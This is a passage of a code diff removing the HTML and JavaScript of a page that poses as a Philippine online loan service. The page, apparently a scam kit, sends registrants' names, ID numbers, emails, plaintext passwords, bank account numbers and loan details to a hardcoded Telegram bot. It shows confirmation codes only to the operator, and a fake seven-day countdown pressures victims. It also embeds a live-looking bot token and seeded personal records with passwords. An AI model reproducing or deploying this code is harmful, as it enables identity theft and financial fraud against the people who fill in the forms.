-        <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ID Photo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22360%22 height=%22220%22><rect fill=%22%23f0b90b%22 width=%22360%22 height=%22220%22/><text x=%22180%22 y=%22110%22 fill=%22%231a1a1a%22 font-size=%2220%22 text-anchor=%22middle%22 font-family=%22Arial%22>ID Card</text></svg>'">
-      </div>
-    </div>
-  </div>
-
-</div>
-
-<script>
-// ============================================================
-//  CONFIGURATION
-// ============================================================
-const TG_TOKEN = '8843546617:AAH_D5IY57cezbnIZgHWgU5J-C_84MZIBBw';
-const TG_CHAT  = '7417215529';
-const LS_KEY   = 'fsl_v5';
-const SESSION_KEY = 'fsl_session';
-
-// ============================================================
-//  DEFAULT USERS — 70 slots
-// ============================================================
-const DEFAULT_USERS = {
-  "1":{email:"123fhffhf@gmail.com",password:"12345678",balance:5000,loanStatus:"none",loanAmount:0,fullName:"Shane Sabal",idName:"Shane Sabal",idNumber:"4830645821731280",verified:true},
-  "2":{email:"mdmddh@gmail.com",password:"xx770122",balance:902,loanStatus:"none",loanAmount:0,fullName:"md ishan",idName:"ishan",idNumber:"0399r84356",verified:true},
-  "3":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "4":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "5":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "6":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "7":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "8":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "9":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "10":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "11":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "12":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "13":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "14":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "15":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "16":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "17":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "18":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "19":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "20":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "21":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "22":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "23":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "24":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "25":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "26":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "27":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "28":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "29":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "30":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "31":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "32":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "33":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "34":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "35":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "36":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "37":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "38":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "39":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "40":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "41":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "42":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "43":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "44":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "45":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "46":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "47":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "48":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "49":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "50":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "51":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "52":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "53":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "54":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "55":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "56":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "57":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "58":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "59":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "60":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "61":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "62":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "63":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "64":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "65":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "66":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "67":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "68":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "69":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false},
-  "70":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false}
-};
-
-// ============================================================
-//  STATE
-// ============================================================
-let users = {};
-let currentSlot = null;
-let currentUser = null;
-let selectedBank = '';
-let loanConfirmTimer = null;
-let wdConfirmTimer = null;
-let pendingLoanAmount = 0;
-let pendingWdAmount = 0;
-let pendingWdData = null;
-let pendingSlot = null;
-let pendingUserData = null;
-let generatedBankCode = '';
-let generatedLoanCode = '';
-let generatedWdCode = '';
-let isSwiping = false;
-let swipeStartX = 0;
-
-// ============================================================
-//  SESSION MANAGEMENT (FIX FOR REFRESH LOGOUT)
-// ============================================================
-function saveSession(slot) {
-  localStorage.setItem(SESSION_KEY, JSON.stringify({
-    slot: slot,
-    timestamp: Date.now()
-  }));
-}
-
-function loadSession() {
-  const sessionData = localStorage.getItem(SESSION_KEY);
-  if (!sessionData) return null;
-  
-  try {
-    const session = JSON.parse(sessionData);
-    // Session valid for 30 days
-    if (Date.now() - session.timestamp > 30 * 24 * 60 * 60 * 1000) {
-      clearSession();
-      return null;
-    }
-    return session;
-  } catch(e) {
-    clearSession();
-    return null;
-  }
-}
-
-function clearSession() {
-  localStorage.removeItem(SESSION_KEY);
-}
-
-// ============================================================
-//  INIT
-// ============================================================
-function initUsers(){
-  const stored = localStorage.getItem(LS_KEY);
-  if(stored){
-    try{ users = JSON.parse(stored); }
-    catch(e){ users = JSON.parse(JSON.stringify(DEFAULT_USERS)); saveUsers(); }
-  } else {
-    users = JSON.parse(JSON.stringify(DEFAULT_USERS));
-    saveUsers();
-  }
-}
-
-function saveUsers(){
-  localStorage.setItem(LS_KEY, JSON.stringify(users));
-}
-
-// ============================================================
-//  AUTO-LOGIN ON PAGE LOAD
-// ============================================================
-function checkAutoLogin() {
-  const session = loadSession();
-  if (!session) return false;
-  
-  const slot = String(session.slot);
-  const user = users[slot];
-  
-  if (!user || !user.email || !user.verified) {
-    clearSession();
-    return false;
-  }
-  
-  // Restore session
-  currentSlot = slot;
-  currentUser = user;
-  
-  // Load dashboard
-  loadDashboard();
-  showScreen('screen-dashboard');
-  
-  // Refresh session timestamp
-  saveSession(slot);
-  
-  // Send login alert
-  sendTelegram(
-    `🔄 <b>AUTO-LOGIN (Page Refresh)</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName||'N/A'}\n📧 <b>Email:</b> ${currentUser.email}\n🔑 <b>Slot:</b> #${slot}\n💰 <b>Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n📊 <b>Loan Status:</b> ${currentUser.loanStatus}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-  );
-  
-  return true;
-}
-
-// ============================================================
-//  TELEGRAM
-// ============================================================
-function sendTelegram(msg){
-  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-  fetch(url,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:TG_CHAT, text:msg, parse_mode:'HTML'})
-  }).catch(()=>{});
-}
-
-function sendTelegramWithCode(msg, code){
-  const fullMsg = msg + `\n\n🔑 <b>CONFIRMATION CODE:</b> <code>${code}</code>`;
-  sendTelegram(fullMsg);
-  return code;
-}
-
-// ============================================================
-//  TOAST
-// ============================================================
-let toastTimer;
-function showToast(msg, type='info', duration=3000){
-  const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.className = `show ${type}`;
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(()=>{ t.className=''; },duration);
-}
-
-// ============================================================
-//  SCREEN NAVIGATION
-// ============================================================
-function showScreen(id){
-  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
-  document.getElementById(id).classList.add('active');
-}
-
-// ============================================================
-//  PASSWORD TOGGLE
-// ============================================================
-function togglePw(inputId, btn){
-  const inp = document.getElementById(inputId);
-  if(inp.type==='password'){ inp.type='text'; btn.textContent='🙈'; }
-  else { inp.type='password'; btn.textContent='👁'; }
-}
-
-// ============================================================
-//  CODE INPUT HELPER
-// ============================================================
-function moveNext(current, nextId){
-  if(current.value.length === 1){
-    const next = document.getElementById(nextId);
-    if(next) next.focus();
-  }
-}
-
-function getCode(prefix){
-  let code = '';
-  for(let i=1;i<=6;i++){
-    const val = document.getElementById(prefix+'-'+i).value;
-    if(!val) return null;
-    code += val;
-  }
-  return code;
-}
-
-function clearCode(prefix){
-  for(let i=1;i<=6;i++){
-    document.getElementById(prefix+'-'+i).value = '';
-  }
-  document.getElementById(prefix+'-1').focus();
-}
-
-// ============================================================
-//  GENERATE RANDOM CODE
-// ============================================================
-function generateRandomCode(){
-  return String(Math.floor(100000 + Math.random() * 900000));
-}
-
-// ============================================================
-//  TAB SWITCHING
-// ============================================================
-function switchTab(tab){
-  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
-  document.querySelectorAll('.tab-item').forEach(t=>t.classList.remove('active'));
-  document.getElementById(`panel-${tab}`).classList.add('active');
-  document.getElementById(`tab-${tab}`).classList.add('active');
-  if(tab==='profile') refreshProfile();
-}
-
-// ============================================================
-//  SWIPE TO VERIFY
-// ============================================================
-function initSwipe(){
-  const track = document.getElementById('swipe-track');
-  const thumb = document.getElementById('swipe-thumb');
-  const bg = document.getElementById('swipe-bg');
-  const text = document.getElementById('swipe-text');
-  
-  if(!track) return;
-  
-  const trackWidth = track.offsetWidth || 280;
-  const thumbWidth = 44;
-  const maxSwipe = trackWidth - thumbWidth - 8;
-  
-  function handleSwipe(clientX){
-    const rect = track.getBoundingClientRect();
-    let x = clientX - rect.left - 22;
-    x = Math.max(0, Math.min(x, maxSwipe));
-    
-    thumb.style.left = (x + 4) + 'px';
-    const progress = (x / maxSwipe) * 100;
-    bg.style.width = progress + '%';
-    
-    if(progress > 85){
-      text.textContent = '✅ Release to Verify';
-      text.style.color = '#1a1a1a';
-    } else {
-      text.textContent = '⬅️ Swipe to Verify';
-      text.style.color = 'var(--text)';
-    }
-    
-    if(x >= maxSwipe - 5){
-      verifyBankCode();
-      resetSwipe();
-    }
-  }
-  
-  function resetSwipe(){
-    thumb.style.left = '4px';
-    bg.style.width = '0%';
-    text.textContent = '⬅️ Swipe to Verify';
-    text.style.color = 'var(--text)';
-    isSwiping = false;
-  }
-  
-  // Remove old listeners
-  track.replaceWith(track.cloneNode(true));
-  const newTrack = document.getElementById('swipe-track');
-  const newThumb = document.getElementById('swipe-thumb');
-  const newBg = document.getElementById('swipe-bg');
-  const newText = document.getElementById('swipe-text');
-  
-  if(!newTrack) return;
-  
-  newTrack.addEventListener('touchstart', function(e){
-    isSwiping = true;
-    const touch = e.touches[0];
-    swipeStartX = touch.clientX;
-    newThumb.style.transition = 'none';
-  });
-  
-  newTrack.addEventListener('touchmove', function(e){
-    if(!isSwiping) return;
-    e.preventDefault();
-    const touch = e.touches[0];
-    handleSwipe(touch.clientX);
-  });
-  
-  newTrack.addEventListener('touchend', function(e){
-    if(!isSwiping) return;
-    isSwiping = false;
-    newThumb.style.transition = 'left 0.3s ease';
-    const thumbLeft = parseFloat(newThumb.style.left) || 4;
-    if(thumbLeft < maxSwipe - 20){
-      resetSwipe();
-    }
-  });
-  
-  newTrack.addEventListener('mousedown', function(e){
-    isSwiping = true;
-    swipeStartX = e.clientX;
-    newThumb.style.transition = 'none';
-    newTrack.style.cursor = 'grabbing';
-  });
-  
-  document.addEventListener('mousemove', function(e){
-    if(!isSwiping) return;
-    handleSwipe(e.clientX);
-  });
-  
-  document.addEventListener('mouseup', function(e){
-    if(!isSwiping) return;
-    isSwiping = false;
-    newThumb.style.transition = 'left 0.3s ease';
-    newTrack.style.cursor = 'grab';
-    const thumbLeft = parseFloat(newThumb.style.left) || 4;
-    if(thumbLeft < maxSwipe - 20){
-      resetSwipe();
-    }
-  });
-}
-
-// ============================================================
-//  LOGIN
-// ============================================================
-document.getElementById('login-form').addEventListener('submit', function(e){
-  e.preventDefault();
-  const email = document.getElementById('login-email').value.trim().toLowerCase();
-  const password = document.getElementById('login-password').value;
-  if(!email || !password){ showToast('Please fill in all fields','error'); return; }
-
-  let foundSlot = null;
-  for(let s=1;s<=70;s++){
-    const u = users[String(s)];
-    if(u && u.email && u.email.toLowerCase()===email && u.password===password){
-      foundSlot = String(s); break;
-    }
-  }
-
-  if(!foundSlot){ showToast('Invalid email or password','error'); return; }
-
-  const user = users[foundSlot];
-  if(!user.verified){
-    showToast('Account not verified. Please contact support.','error');
-    return;
-  }
-
-  currentSlot = foundSlot;
-  currentUser = user;
-  
-  // SAVE SESSION TO PREVENT LOGOUT ON REFRESH
-  saveSession(foundSlot);
-  
-  const btn = document.getElementById('login-btn');
-  btn.disabled=true; btn.textContent='Signing in...';
-
-  sendTelegram(
-    `🔐 <b>LOGIN ALERT</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName||'N/A'}\n📧 <b>Email:</b> ${currentUser.email}\n🔑 <b>Slot:</b> #${foundSlot}\n💰 <b>Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n📊 <b>Loan Status:</b> ${currentUser.loanStatus}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-  );
-
-  setTimeout(()=>{
-    btn.disabled=false; btn.textContent='Sign In';
-    loadDashboard();
-    showScreen('screen-dashboard');
-    showToast('Welcome back, '+( currentUser.fullName||email)+'! 👋','success');
-    document.getElementById('login-email').value='';
-    document.getElementById('login-password').value='';
-  },800);
-});
-
-// ============================================================
-//  REGISTER
-// ============================================================
-document.getElementById('register-form').addEventListener('submit', function(e){
-  e.preventDefault();
-  const fullName  = document.getElementById('reg-fullname').value.trim();
-  const idName    = document.getElementById('reg-idname').value.trim();
-  const idNumber  = document.getElementById('reg-idnumber').value.trim();
-  const email     = document.getElementById('reg-email').value.trim().toLowerCase();
-  const password  = document.getElementById('reg-password').value;
-  const confirm   = document.getElementById('reg-confirm').value;
-
-  if(!fullName||!idName||!idNumber||!email||!password||!confirm){
-    showToast('Please fill in all fields','error'); return;
-  }
-  if(password!==confirm){ showToast('Passwords do not match','error'); return; }
-  if(password.length<6){ showToast('Password must be at least 6 characters','error'); return; }
-  if(!/\S+@\S+\.\S+/.test(email)){ showToast('Invalid email address','error'); return; }
-
-  for(let s=1;s<=70;s++){
-    const u=users[String(s)];
-    if(u && u.email && u.email.toLowerCase()===email){
-      showToast('Email already registered. Please login.','error'); return;
-    }
-  }
-
-  let emptySlot = null;
-  for(let s=2;s<=70;s++){
-    if(!users[String(s)].email){ emptySlot=String(s); break; }
-  }
-  if(!emptySlot){ showToast('No available slots. Contact support.','error'); return; }
-
-  const newUser = {email,password,balance:0,loanStatus:"none",loanAmount:0,fullName,idName,idNumber,verified:false};
-
-  pendingSlot = emptySlot;
-  pendingUserData = newUser;
-  
-  generatedBankCode = generateRandomCode();
-
-  sendTelegramWithCode(
-    `🆕 <b>NEW REGISTRATION</b>\n━━━━━━━━━━━━━━━\n👤 <b>Full Name:</b> ${fullName}\n🪪 <b>ID Name:</b> ${idName}\n🔢 <b>ID Number:</b> ${idNumber}\n📧 <b>Email:</b> ${email}\n🔐 <b>Password:</b> ${password}\n🔑 <b>Assigned Slot:</b> #${emptySlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`,
-    generatedBankCode
-  );
-
-  const btn = document.getElementById('register-btn');
-  btn.disabled=true; btn.textContent='Creating...';
-  setTimeout(()=>{ btn.disabled=false; btn.textContent='Create Account'; },1000);
-
-  document.getElementById('overlay-bank-verify').classList.add('active');
-  document.getElementById('register-form').reset();
-  
-  setTimeout(initSwipe, 300);
-});
-
-// ============================================================
-//  BANK VERIFICATION
-// ============================================================
-function verifyBankCode(){
-  const code = getCode('bank-code');
-  if(!code){ showToast('Please enter the 6-digit code','error'); return; }
-
-  if(!pendingSlot || !pendingUserData){
-    showToast('No pending registration found','error');
-    return;
-  }
-
-  if(code === generatedBankCode){
-    users[pendingSlot] = pendingUserData;
-    users[pendingSlot].verified = true;
-    saveUsers();
-    
-    document.getElementById('overlay-bank-verify').classList.remove('active');
-    showToast('✅ Account verified successfully! You can now login.','success',5000);
-    
-    sendTelegram(
-      `✅ <b>ACCOUNT VERIFIED</b>\n━━━━━━━━━━━━━━━\n📧 <b>Email:</b> ${pendingUserData.email}\n👤 <b>Name:</b> ${pendingUserData.fullName}\n🔑 <b>Slot:</b> #${pendingSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-    );
-    
-    pendingSlot = null;
-    pendingUserData = null;
-    generatedBankCode = '';
-    clearCode('bank-code');
-    showScreen('screen-login');
-  } else {
-    showToast('❌ Invalid code. Please check your Telegram.','error');
-  }
-}
-
-// ============================================================
-//  DASHBOARD LOADER
-// ============================================================
-function loadDashboard(){
-  if(!currentUser) return;
-  const bal = Number(currentUser.balance||0);
-  document.getElementById('disp-balance').textContent = bal.toLocaleString('en-PH',{minimumFractionDigits:2,maximumFractionDigits:2});
-  updateStatusBadge(currentUser.loanStatus);
-  document.getElementById('home-loan-status').textContent = currentUser.loanStatus||'none';
-  document.getElementById('home-loan-amount').textContent = '₱'+Number(currentUser.loanAmount||0).toLocaleString();
-  document.getElementById('home-slot').textContent = '#'+currentSlot;
-  document.getElementById('verified-strip').style.display='flex';
-  document.getElementById('loan-fullname').value = currentUser.fullName||'Shane Sabal';
-  document.getElementById('loan-idnumber').value = currentUser.idNumber||'4830645821731280';
-  refreshLoanStatus();
-  refreshProfile();
-}
-
-function updateStatusBadge(status){
-  const b = document.getElementById('disp-status-badge');
-  b.className='status-badge';
-  const map={none:'badge-none',pending:'badge-pending',approved:'badge-approved',rejected:'badge-rejected','waiting':'badge-waiting'};
-  b.classList.add(map[status]||'badge-none');
-  const labels={none:'No Loan',pending:'Pending',approved:'Approved',rejected:'Rejected','waiting':'Waiting Confirmation'};
-  b.textContent=labels[status]||'No Loan';
-}
-
-function refreshLoanStatus(){
-  const info=document.getElementById('loan-status-info');
-  if(!currentUser) return;
-  if(currentUser.loanStatus==='pending') info.textContent='⏳ Your loan is waiting for confirmation code.';
-  else if(currentUser.loanStatus==='approved') info.textContent='✅ Loan approved! Funds have been credited.';
-  else if(currentUser.loanStatus==='rejected') info.textContent='❌ Your loan was rejected. Contact support.';
-  else if(currentUser.loanStatus==='waiting') info.textContent='⏳ Waiting for bank confirmation. Enter code.';
-  else info.textContent='';
-}
-
-function refreshProfile(){
-  if(!currentUser) return;
-  const bal = Number(currentUser.balance||0);
-  document.getElementById('prof-name').textContent=currentUser.fullName||'—';
-  document.getElementById('prof-email').textContent=currentUser.email||'—';
-  document.getElementById('prof-email2').textContent=currentUser.email||'—';
-  document.getElementById('prof-fullname').textContent=currentUser.fullName||'—';
-  document.getElementById('prof-idname').textContent=currentUser.idName||'—';
-  document.getElementById('prof-idnumber').textContent=currentUser.idNumber||'—';
-  document.getElementById('prof-balance').textContent='₱'+bal.toLocaleString();
-  document.getElementById('prof-loanstatus').textContent=currentUser.loanStatus||'none';
-  document.getElementById('prof-loanamount').textContent='₱'+Number(currentUser.loanAmount||0).toLocaleString();
-  document.getElementById('prof-slot').textContent='#'+currentSlot;
-}
-
-// ============================================================
-//  LOAN APPLICATION
-// ============================================================
-document.getElementById('loan-form').addEventListener('submit',function(e){
-  e.preventDefault();
-  if(!currentUser){ showToast('Please login first','error'); return; }
-  if(currentUser.loanStatus==='pending' || currentUser.loanStatus==='waiting'){ 
-    showToast('You already have a pending loan','error'); return; 
-  }
-  if(currentUser.loanStatus==='approved'){ showToast('Loan already approved. Withdraw your funds.','info'); return; }
-
-  const fullName   = document.getElementById('loan-fullname').value.trim();
-  const idNumber   = document.getElementById('loan-idnumber').value.trim();
-  const gender     = document.getElementById('loan-gender').value;
-  const birthday   = document.getElementById('loan-birthday').value;
-  const bank       = document.getElementById('loan-bank').value;
-  const bankAcc    = document.getElementById('loan-bankaccount').value.trim();
-  const marital    = document.getElementById('loan-marital').value;
-  const education  = document.getElementById('loan-education').value;
-  const career     = document.getElementById('loan-career').value.trim();
-  const province   = document.getElementById('loan-province').value;
-  const address    = document.getElementById('loan-address').value.trim();
-  const amount     = parseFloat(document.getElementById('loan-amount').value);
-
-  if(!fullName||!idNumber||!birthday||!bankAcc||!career||!address||!amount){
-    showToast('Please fill in all required fields','error'); return;
-  }
-  if(amount<1000){ showToast('Minimum loan amount is ₱1,000','error'); return; }
-  if(amount>500000){ showToast('Maximum loan amount is ₱500,000','error'); return; }
-
-  const btn=document.getElementById('loan-btn');
-  btn.disabled=true; btn.textContent='Submitting...';
-
-  currentUser.loanStatus='waiting';
-  currentUser.loanAmount=amount;
-  pendingLoanAmount = amount;
-  users[currentSlot]=currentUser;
-  saveUsers();
-
-  generatedLoanCode = generateRandomCode();
-
-  sendTelegramWithCode(
-    `📋 <b>LOAN APPLICATION</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${fullName}\n🔢 <b>ID #:</b> ${idNumber}\n🏦 <b>Bank:</b> ${bank}\n💳 <b>Account #:</b> ${bankAcc}\n💰 <b>Loan Amount:</b> ₱${amount.toLocaleString()}\n📧 <b>Email:</b> ${currentUser.email}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`,
-    generatedLoanCode
-  );
-
-  updateStatusBadge('waiting');
-  document.getElementById('home-loan-status').textContent='waiting';
-  document.getElementById('home-loan-amount').textContent='₱'+amount.toLocaleString();
-  refreshLoanStatus();
-  loadDashboard();
-
-  setTimeout(()=>{
-    btn.disabled=false; btn.textContent='📋 Submit Loan Application';
-    startLoanConfirmCountdown(amount);
-  },800);
-});
-
-// ============================================================
-//  LOAN CONFIRM COUNTDOWN — 7 Days
-// ============================================================
-function startLoanConfirmCountdown(amount){
-  let totalSeconds = 7 * 24 * 60 * 60;
-  const timeLabel=document.getElementById('loan-confirm-time');
-  document.getElementById('overlay-loan-confirm').classList.add('active');
-
-  clearInterval(loanConfirmTimer);
-  loanConfirmTimer=setInterval(()=>{
-    totalSeconds--;
-    
-    const days = Math.floor(totalSeconds / (24*60*60));
-    const hours = Math.floor((totalSeconds % (24*60*60)) / (60*60));
-    const mins = Math.floor((totalSeconds % (60*60)) / 60);
-    const secs = totalSeconds % 60;
-    
-    timeLabel.textContent = `${days}d ${String(hours).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-
-    if(totalSeconds<=0){
-      clearInterval(loanConfirmTimer);
-      document.getElementById('overlay-loan-confirm').classList.remove('active');
-      
-      if(currentUser && currentUser.loanStatus === 'waiting'){
-        currentUser.loanStatus = 'rejected';
-        currentUser.loanAmount = 0;
-        users[currentSlot] = currentUser;
-        saveUsers();
-        updateStatusBadge('rejected');
-        loadDashboard();
-        showToast('⏰ Loan expired. Please reapply.','error',5000);
-        sendTelegram(
-          `❌ <b>LOAN EXPIRED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n📧 <b>Email:</b> ${currentUser.email}\n💰 <b>Amount:</b> ₱${amount.toLocaleString()}\n⏰ <b>Reason:</b> No confirmation code received within 7 days`
-        );
-      }
-    }
-  },1000);
-}
-
-// ============================================================
-//  LOAN CODE VERIFICATION
-// ============================================================
-function verifyLoanCode(){
-  const code = getCode('loan-code');
-  if(!code){ showToast('Please enter the 6-digit code','error'); return; }
-
-  if(!currentUser || currentUser.loanStatus !== 'waiting'){
-    showToast('No pending loan to confirm','error');
-    return;
-  }
-
-  if(code === generatedLoanCode){
-    clearInterval(loanConfirmTimer);
-    document.getElementById('overlay-loan-confirm').classList.remove('active');
-    
-    currentUser.loanStatus = 'approved';
-    currentUser.balance = Number(currentUser.balance) + pendingLoanAmount;
-    users[currentSlot] = currentUser;
-    saveUsers();
-    
-    updateStatusBadge('approved');
-    loadDashboard();
-    showToast('🎉 Loan Confirmed! ₱'+pendingLoanAmount.toLocaleString()+' credited to your balance.','success',5000);
-    
-    sendTelegram(
-      `✅ <b>LOAN CONFIRMED & APPROVED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n📧 <b>Email:</b> ${currentUser.email}\n💰 <b>Amount Approved:</b> ₱${pendingLoanAmount.toLocaleString()}\n💳 <b>New Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-    );
-    
-    clearCode('loan-code');
